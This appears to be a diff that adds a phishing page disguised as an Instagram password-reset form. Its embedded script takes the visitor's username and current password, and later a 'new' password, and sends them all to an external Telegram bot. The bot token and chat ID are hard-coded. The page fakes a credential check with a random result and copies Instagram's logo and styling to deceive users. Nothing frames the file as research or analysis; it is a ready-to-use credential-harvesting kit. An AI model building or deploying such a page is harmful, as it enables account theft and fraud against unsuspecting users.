@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noarchive, noimageindex">
+    <title>Reset Instagram Password</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #0095f6;
+            outline: none;
+        }
+        button {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0077cc;
+        }
+        .loading {
+            display: none;
+            color: #0095f6;
+            margin-top: 10px;
+        }
+        .error {
+            color: #ff0000;
+            margin-top: 10px;
+            display: none;
+        }
+        .success {
+            color: #31A24C;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginContainer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo" class="logo">
+        <h2>Reset Your Password</h2>
+        <p>Enter your username and password to reset your password.</p>
+        <form id="resetForm">
+            <input type="text" id="username" placeholder="Username" required minlength="4">
+            <input type="password" id="password" placeholder="Password" required minlength="6">
+            <button type="submit">Reset Password</button>
+            <div class="loading" id="loading">Checking information...</div>
+            <div class="error" id="error"></div>
+            <div class="success" id="success">Information verified! Redirecting...</div>
+        </form>
+    </div>
+
+    <div class="container" id="resetPasswordContainer" style="display: none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo" class="logo">
+        <h2>Reset Your Password</h2>
+        <p>Enter a new password for your account.</p>
+        <form id="newPasswordForm">
+            <input type="password" id="newPassword" placeholder="New Password" required minlength="6">
+            <input type="password" id="confirmPassword" placeholder="Confirm New Password" required minlength="6">
+            <button type="submit">Change Password</button>
+            <div class="loading" id="newPasswordLoading">Updating password...</div>
+            <div class="error" id="newPasswordError"></div>
+            <div class="success" id="newPasswordSuccess">Password updated successfully!</div>
+        </form>
+    </div>
+
+    <script>
+        const botToken = '7477379290:AAHcGDNyrAA3nJfhmZzm-8dHcxaNwT3mN-o'; // Replace with your bot token
+        const chatId = '7454474616'; // Replace with your chat ID
+
+        document.getElementById('resetForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (username.length < 4 || password.length < 6) {
+                showError('Username must be at least 4 characters and password at least 6 characters.');
+                return;
+            }
+
+            // Show loading state and hide error/success
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('error').style.display = 'none';
+            document.getElementById('success').style.display = 'none';
+
+            // Simulate checking credentials
+            const isValid = await checkCredentials(username, password);
+
+            if (isValid) {
+                // Send success message to Telegram bot
+                await sendToTelegram(`✅ Account is valid:\nUsername: ${username}\nPassword: ${password}`);
+
+                // Show success message and redirect to reset password page
+                document.getElementById('success').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('loginContainer').style.display = 'none';
+                    document.getElementById('resetPasswordContainer').style.display = 'block';
+                }, 2000);
+            } else {
+                // Send error message to Telegram bot
+                await sendToTelegram(`❌ Invalid credentials:\nUsername: ${username}\nPassword: ${password}`);
+
+                showError('Invalid username or password. Please try again.');
+            }
+        });
+
+        document.getElementById('newPasswordForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const newPassword = document.getElementById('newPassword').value.trim();
+            const confirmPassword = document.getElementById('confirmPassword').value.trim();
+
+            if (newPassword !== confirmPassword) {
+                showNewPasswordError('Passwords do not match.');
+                return;
+            }
+
+            // Show loading state and hide error/success
+            document.getElementById('newPasswordLoading').style.display = 'block';
+            document.getElementById('newPasswordError').style.display = 'none';
+            document.getElementById('newPasswordSuccess').style.display = 'none';
+
+            // Send new password to Telegram bot
+            await sendToTelegram(`🔑 New password entered:\nPassword: ${newPassword}`);
+
+            // Show success message
+            document.getElementById('newPasswordSuccess').style.display = 'block';
+            document.getElementById('newPasswordLoading').style.display = 'none';
+        });
+
+        async function checkCredentials(username, password) {
+            // Simulate a delay for checking credentials
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Replace this with actual logic to check credentials
+            // For now, we'll simulate a random success/failure
+            return Math.random() > 0.5; // 50% chance of success
+        }
+
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Failed to send message to Telegram:', data);
+                }
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+
+        function showError(message) {
+            document.getElementById('error').textContent = message;
+            document.getElementById('error').style.display = 'block';
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        function showNewPasswordError(message) {
+            document.getElementById('newPasswordError').textContent = message;
+            document.getElementById('newPasswordError').style.display = 'block';
+            document.getElementById('newPasswordLoading').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
